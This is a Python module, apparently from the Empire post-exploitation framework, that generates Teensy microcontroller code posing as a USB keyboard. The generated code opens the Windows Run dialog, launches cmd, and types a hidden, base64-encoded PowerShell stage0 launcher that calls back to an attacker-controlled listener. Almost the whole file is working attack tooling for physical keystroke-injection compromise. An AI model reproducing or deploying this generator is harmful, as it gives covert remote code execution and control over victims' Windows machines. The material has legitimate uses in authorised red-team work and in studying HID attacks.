from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'TeensyLauncher',

            'Author': ['@dabisec'],

            'Description': ('Generates a teensy script that runs a one-liner stage0 launcher for Empire.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to output duckyscript to.',
                'Required'      :   True,
                'Value'         :   ''
            },       
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'TeensyLED' : {
                'Description'   :   'Set Teensy LED status',
                'Required'      :   False,
                'Value'         :   True
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        teensyLED  = self.options['TeensyLED']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            enc = launcher.split(" ")[-1]

            if teensyLED:
                teensyCode = """
                    // Teensy has LED on 13
                    const int led_pin = 13;
                """

            teensyCode += """
                void delays(unsigned long time)
                {
                  delay(time * 1);
                }
            """

            teensyCode += """
                void press_numlock(void)
                {
                  Keyboard.set_key1(KEY_NUM_LOCK);
                  Keyboard.send_now();
                  delays(200);
                }

                void unpress_key(void)
                {
                  Keyboard.set_modifier(0);
                  Keyboard.set_key1(0);
                  Keyboard.set_key2(0);
                  Keyboard.send_now();
                  delays(500);
                }

                bool is_num_on(void)    {
                  return ((keyboard_leds & 1) == 1) ? true : false;
                }
            """

            teensyCode += """
                void wait_for_drivers(unsigned int speed)
                {
                  bool numLockTrap = is_num_on();
                  while (numLockTrap == is_num_on())
                  {
                    press_numlock();
                    unpress_key();
                    delays(speed);
                  }
                  press_numlock();
                  unpress_key();
                  delays(speed);
                }
            """

            if teensyLED:
                teensyCode += """
                    void blink_fast(int blinkrate, int delaytime)
                    {
                      int blinkcounter = 0;
                      for (blinkcounter = 0; blinkcounter != blinkrate; blinkcounter++)
                      {
                        digitalWrite(led_pin, HIGH);
                        delay(delaytime);
                        digitalWrite(led_pin, LOW);
                        delay(delaytime);
                      }
                    }
                """

            teensyCode += """
                void setup() {
            """

            if teensyLED:
                teensyCode += """
                      pinMode(led_pin, OUTPUT);
                      Serial.begin(9600);

                      blink_fast(10, 80);
                      delays(500);
                """

            teensyCode += """
                  wait_for_drivers(200);
                """

            if teensyLED:
                teensyCode += """
                      blink_fast(3, 80);
                      delays(200);
                """

            teensyCode += """
                  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
                  Keyboard.send_now();
                  Keyboard.set_key2(KEY_R);
                  Keyboard.send_now();
                  Keyboard.set_modifier(0);
                  Keyboard.send_now();
                  delays(300);
                  unpress_key();
                  Keyboard.print("cmd");
                  delays(300);
                  Keyboard.set_key1(KEY_ENTER);
                  Keyboard.send_now();
                  delays(100);
                  unpress_key();
            """

            teensyCode += """
                  Keyboard.print("powershell.exe -NoP -NonI -W Hidden -Enc {} ");
            """.format(enc)

            teensyCode += """
                  delays(500);
                  Keyboard.set_key1(KEY_ENTER);
                  Keyboard.send_now();
                  delays(200);
                  unpress_key();
            """

            if teensyLED:
                teensyCode += """
                      digitalWrite(led_pin, HIGH);
                """

            teensyCode += """
                }
            """

            teensyCode += """
                void loop() {
                  // put your main code here, to run repeatedly:

                }

            """

            return teensyCode
